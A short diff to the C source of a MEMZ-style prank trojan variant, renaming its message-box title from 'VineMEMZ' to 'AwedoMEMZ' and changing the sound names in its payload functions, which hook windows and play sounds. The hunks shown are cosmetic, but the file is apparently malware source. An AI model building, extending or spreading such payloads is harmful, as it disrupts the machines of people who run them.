@@ -162,7 +162,7 @@ PAYLOADHOST(payloadCrazyBus) {
 
 DWORD WINAPI messageThread(LPVOID parameter) {
 	HHOOK hook = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton, 0, GetCurrentThreadId());
-	MessageBoxW(NULL, (LPWSTR)parameter, L"VineMEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONEXCLAMATION);
+	MessageBoxW(NULL, (LPWSTR)parameter, L"AwedoMEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONEXCLAMATION);
 	UnhookWindowsHookEx(hook);
 
 	return 0;
@@ -631,9 +631,9 @@ BOOL CALLBACK hideProc2(HWND hwnd, LPARAM lParam) {
 PAYLOADFUNCTIONDEFAULT(payloadJoelSounds) {
 	if (!block)
 		if (random()%4>0)
-			playSound(L"succ", L"Data\\5.bin", FALSE);
+			playSound(L"thicc", L"Data\\5.bin", FALSE);
 		else
-			playSound(L"kupteraz", L"Data\\6.bin", FALSE);
+			playSound(L"koopnu", L"Data\\6.bin", FALSE);
 
 	return 10;
 }
